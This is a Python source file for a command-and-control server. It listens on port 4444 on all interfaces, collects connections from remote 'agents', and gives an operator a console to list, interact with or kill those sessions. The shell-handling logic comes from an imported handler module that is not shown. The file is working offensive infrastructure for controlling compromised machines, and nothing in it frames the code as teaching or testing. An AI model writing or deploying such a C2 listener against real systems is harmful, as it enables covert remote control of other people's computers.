#!/usr/bin/env python3
import socket
import threading
import sys
import os
from handler import SessionHandler

HOST = "0.0.0.0"
PORT = 4444

sessions = {}
sessions_lock = threading.Lock()
session_id_counter = 0

def handle_agent(conn, addr, sid):
    handler = SessionHandler(conn, addr, sid)
    with sessions_lock:
        sessions[sid] = handler
    print(f"\n[+] Agent [{sid}] connected from {addr[0]}:{addr[1]}")
    print("[*] Type 'sessions' to list agents, 'interact <id>' to connect.\n> ", end="", flush=True)
    handler.run()
    with sessions_lock:
        del sessions[sid]
    print(f"\n[-] Agent [{sid}] disconnected.\n> ", end="", flush=True)

def accept_loop(server):
    global session_id_counter
    while True:
        try:
            conn, addr = server.accept()
            session_id_counter += 1
            t = threading.Thread(target=handle_agent, args=(conn, addr, session_id_counter), daemon=True)
            t.start()
        except OSError:
            break

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(10)
    print(f"[*] C2 server listening on {HOST}:{PORT}")
    print("[*] Commands: sessions | interact <id> | kill <id> | exit\n")

    t = threading.Thread(target=accept_loop, args=(server,), daemon=True)
    t.start()

    while True:
        try:
            cmd = input("> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down.")
            server.close()
            sys.exit(0)

        if not cmd:
            continue

        elif cmd == "sessions":
            with sessions_lock:
                if not sessions:
                    print("[-] No active sessions.")
                else:
                    print(f"\n  {'ID':<5} {'Address':<22} {'OS':<12}")
                    print(f"  {'-'*5}  {'-'*22}  {'-'*12}")
                    for sid, h in sessions.items():
                        print(f"  {sid:<5} {h.addr[0]+':'+str(h.addr[1]):<22} {h.os_info:<12}")
                    print()

        elif cmd.startswith("interact "):
            try:
                sid = int(cmd.split()[1])
                with sessions_lock:
                    handler = sessions.get(sid)
                if handler:
                    handler.interact()
                else:
                    print(f"[-] No session with ID {sid}")
            except (IndexError, ValueError):
                print("[-] Usage: interact <id>")

        elif cmd.startswith("kill "):
            try:
                sid = int(cmd.split()[1])
                with sessions_lock:
                    handler = sessions.get(sid)
                if handler:
                    handler.close()
                    print(f"[+] Session {sid} killed.")
                else:
                    print(f"[-] No session with ID {sid}")
            except (IndexError, ValueError):
                print("[-] Usage: kill <id>")

        elif cmd == "exit":
            print("[*] Shutting down.")
            server.close()
            sys.exit(0)

        else:
            print("[-] Unknown command. Try: sessions | interact <id> | kill <id> | exit")

if __name__ == "__main__":
    main()
